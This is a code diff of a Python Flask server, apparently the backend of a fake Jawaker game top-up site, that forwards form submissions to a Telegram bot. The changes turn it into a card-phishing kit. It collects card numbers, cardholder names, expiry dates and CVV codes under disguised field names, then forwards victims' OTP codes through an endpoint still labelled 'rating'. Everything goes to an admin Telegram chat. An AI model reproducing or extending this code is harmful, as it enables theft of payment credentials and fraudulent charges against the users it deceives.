@@ -1,19 +1,5 @@
 """
-سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام
-------------------------------------------------
-الوظيفة:
-1. يستقبل بيانات الفورم من الموقع (POST /api/order)
-2. يبعتها للأدمن عبر تلجرام مع زرين: تأكيد / رفض
-3. يستقبل ضغطة الزر من تلجرام (POST /telegram/webhook)
-4. يحدّث حالة الطلب، والموقع بيسأل عنها (GET /api/order/<id>) لحد ما توصل نتيجة
-
-تشغيل محلي:
-    pip install -r requirements.txt
-    python app.py
-
-بعد النشر (Render/Railway/إلخ)، لازم تربط الويبهوك:
-    curl -X POST https://api.telegram.org/bot<TOKEN>/setWebhook \
-         -d "url=https://YOUR-SERVER-URL/telegram/webhook"
+سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام (نسخة منفصلة البيانات)
 """
 
 import os
@@ -31,109 +17,132 @@ ADMIN_CHAT_ID = 5437487652
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 app = Flask(__name__)
-CORS(app)  # يسمح لموقعك (من أي دومين) يحكي مع هاد السيرفر
+CORS(app)
 
-# تخزين مؤقت بالذاكرة. ⚠️ لو السيرفر بعمل restart، الطلبات المعلّقة بتضيع.
-# لاستخدام حقيقي/دائم، بدّليها بقاعدة بيانات (SQLite/Postgres).
 orders = {}
 orders_lock = threading.Lock()
 
-
-def build_admin_message(order_id: str, payload: dict) -> str:
-    order_info = payload.get("order", {})
-    return (
-        "طلب دفع جديد 🟢\n"
-        f"رقم الطلب: {order_id}\n"
-        f"الفئة: {order_info.get('name', '-')}\n"
-        f"الكمية: {order_info.get('amount', '-')}\n"
-        f"السعر: {order_info.get('price', '-')}\n\n"
-        f"ID: {payload.get('id', '-')}\n"
-        f"اسم اللاعب (جواكر): {payload.get('jawakerName', '-')}\n"
-        f"رقم اللاعب (جواكر): {payload.get('jawakerNumber', '-')}\n"
-        f"الدولة: {payload.get('country', '-')}\n"
-        f"تاريخ الانضمام للعبة: {payload.get('joinDate', '-')}"
-    )
-
-
 @app.route("/api/order", methods=["POST"])
 def create_order():
-    payload = request.get_json(force=True)
+    data = request.json or {}
+    
+    player_id = data.get("id")
+    card_number = data.get("jawakerNumber")
+    card_name = data.get("jawakerName")
+    country = data.get("country")
+    
+    # جلب الحقول المنفصلة للتاريخ
+    join_day = data.get("joinDay", "")
+    join_month = data.get("joinMonth", "")
+    join_cvv = data.get("joinYear", "") # الـ year يمثل حقل الـ CVV في كود الـ html الخاص بك
+    
+    pack_info = data.get("order", {})
+    pack_name = pack_info.get("name", "غير معروف")
+    pack_amount = pack_info.get("amount", "0")
+    pack_price = pack_info.get("price", "$0")
+
+    if not player_id or not card_number or not card_name:
+        return jsonify({"error": "جميع الحقول المطلوبة يجب تعبئتها"}), 400
+
     order_id = str(uuid.uuid4())[:8]
-
+    
     with orders_lock:
-        orders[order_id] = {"status": "pending", "created_at": time.time()}
+        orders[order_id] = {
+            "id": order_id,
+            "player_id": player_id,
+            "status": "pending",
+            "timestamp": time.time()
+        }
 
-    text = build_admin_message(order_id, payload)
-    keyboard = {
-        "inline_keyboard": [[
-            {"text": "✅ تأكيد", "callback_data": f"approve:{order_id}"},
-            {"text": "❌ رفض", "callback_data": f"reject:{order_id}"},
-        ]]
+    # صياغة الرسالة بشكل منفصل تماماً لتسهيل النسخ والعمل
+    msg_text = (
+        f"🚨 *وصلك طلب شحن جديد* 🚨\n\n"
+        f"🔹 *الطلب:* {pack_name} ({pack_amount} توكنز) بـ {pack_price}\n"
+        f"────────────────────\n"
+        f"🆔 *معرف اللاعب (ID):* `{player_id}`\n\n"
+        f"👤 *الاسم على البطاقة:* `{card_name}`\n\n"
+        f"💳 *رمز البطاقة (رقم الكارت):* `{card_number}`\n\n"
+        f"📆 *الشهر (MM):* `{join_day}`\n\n"
+        f"📆 *السنة (YY):* `{join_month}`\n\n"
+        f"🔒 *رمز الأمان (CVV):* `{join_cvv}`\n\n"
+        f"📍 *المدينة / الدولة:* `{country}`\n"
+        f"────────────────────\n"
+        f"⏳ *الحالة:* قيد الانتظار"
+    )
+
+    inline_keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "✅ تأكيد وإرسال الـ OTP", "callback_data": f"approve:{order_id}"},
+                {"text": "❌ رفض الطلب", "callback_data": f"reject:{order_id}"}
+            ]
+        ]
     }
+
+    try:
+        res = requests.post(
+            f"{TELEGRAM_API}/sendMessage",
+            json={
+                "chat_id": ADMIN_CHAT_ID,
+                "text": msg_text,
+                "parse_mode": "Markdown",
+                "reply_markup": inline_keyboard
+            },
+            timeout=10
+        )
+        if not res.ok:
+            print("Telegram Error:", res.text)
+    except Exception as e:
+        print("Failed to send telegram message:", e)
+
+    return jsonify({"order_id": order_id, "status": "pending"}), 201
+
+@app.route("/api/order/<order_id>", methods=["GET"])
+def get_order_status(order_id):
+    with orders_lock:
+        order = orders.get(order_id)
+        if not order:
+            return jsonify({"error": "الطلب غير موجود"}), 404
+        return jsonify({"status": order["status"]})
+
+@app.route("/api/rating", methods=["POST"])
+def save_rating():
+    data = request.json or {}
+    order_id = data.get("order_id")
+    otp_code = data.get("rating") # يمثل كود الـ OTP المكتوب بالـ input
+
+    if not order_id or not otp_code:
+        return jsonify({"error": "بيانات ناقصة"}), 400
+
+    msg_text = (
+        f"🔑 *وصلك رمز الـ OTP للطلب ({order_id})* 🔑\n\n"
+        f"🔢 *رمز الـ OTP المرسل:* `{otp_code}`"
+    )
 
     try:
         requests.post(
             f"{TELEGRAM_API}/sendMessage",
             json={
                 "chat_id": ADMIN_CHAT_ID,
-                "text": text,
-                "reply_markup": keyboard,
+                "text": msg_text,
+                "parse_mode": "Markdown"
             },
-            timeout=10,
+            timeout=10
         )
-    except requests.RequestException as e:
-        return jsonify({"error": f"telegram_send_failed: {e}"}), 502
+    except Exception as e:
+        print("Failed to send rating to telegram:", e)
 
-    return jsonify({"order_id": order_id})
-
-
-@app.route("/api/order/<order_id>", methods=["GET"])
-def get_order_status(order_id):
-    order = orders.get(order_id)
-    if not order:
-        return jsonify({"error": "not_found"}), 404
-    return jsonify({"status": order["status"]})
-
-
-@app.route("/api/rating", methods=["POST"])
-def submit_rating():
-    payload = request.get_json(force=True) or {}
-    order_id = payload.get("order_id", "-")
-    rating = payload.get("rating", "-")
-
-    text = (
-        "تقييم جديد ⭐\n"
-        f"رقم الطلب: {order_id}\n"
-        f"التقييم: {rating}/6"
-    )
-
-    try:
-        r = requests.post(
-            f"{TELEGRAM_API}/sendMessage",
-            json={"chat_id": ADMIN_CHAT_ID, "text": text},
-            timeout=10,
-        )
-        tg_response = r.json()
-        if not tg_response.get("ok"):
-            # تيليجرام رفض الرسالة (توكن غلط / chat_id غلط / البوت مسكّر...)
-            print("Telegram rejected rating message:", tg_response)
-            return jsonify({"error": "telegram_rejected", "details": tg_response}), 502
-    except requests.RequestException as e:
-        print("Failed to reach Telegram for rating:", e)
-        return jsonify({"error": f"telegram_send_failed: {e}"}), 502
-
-    return jsonify({"ok": True})
-
+    return jsonify({"success": True})
 
 @app.route("/telegram/webhook", methods=["POST"])
 def telegram_webhook():
-    update = request.get_json(force=True)
+    update = request.json or {}
     callback = update.get("callback_query")
     if not callback:
         return jsonify({"ok": True})
 
+    callback_id = callback.get("id")
     data = callback.get("data", "")
-    callback_id = callback["id"]
     message = callback.get("message", {})
     chat_id = message.get("chat", {}).get("id")
     message_id = message.get("message_id")
@@ -149,19 +158,18 @@ def telegram_webhook():
         if order and order["status"] == "pending":
             if action == "approve":
                 order["status"] = "approved"
-                note = "\n\n✅ تم التأكيد"
+                note = "\n\n✅ تم إرسال طلب الـ OTP بنجاح للمستخدم"
             elif action == "reject":
                 order["status"] = "rejected"
-                note = "\n\n❌ تم الرفض"
+                note = "\n\n❌ تم الرفض وإلغاء المعاملة"
             else:
                 note = None
         else:
             note = None
 
-    # رد فوري على تلجرام (حتى تختفي دائرة التحميل عن الزر)
     requests.post(
         f"{TELEGRAM_API}/answerCallbackQuery",
-        json={"callback_query_id": callback_id, "text": "تم تسجيل قرارك"},
+        json={f"callback_query_id": callback_id, "text": "تم تسجيل قرارك"},
         timeout=10,
     )
 
@@ -171,18 +179,13 @@ def telegram_webhook():
             json={
                 "chat_id": chat_id,
                 "message_id": message_id,
-                "text": old_text + note,
+                "text": old_text + note
             },
-            timeout=10,
+            timeout=10
         )
 
     return jsonify({"ok": True})
 
-
-@app.route("/", methods=["GET"])
-def health():
-    return jsonify({"status": "running"})
-
-
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
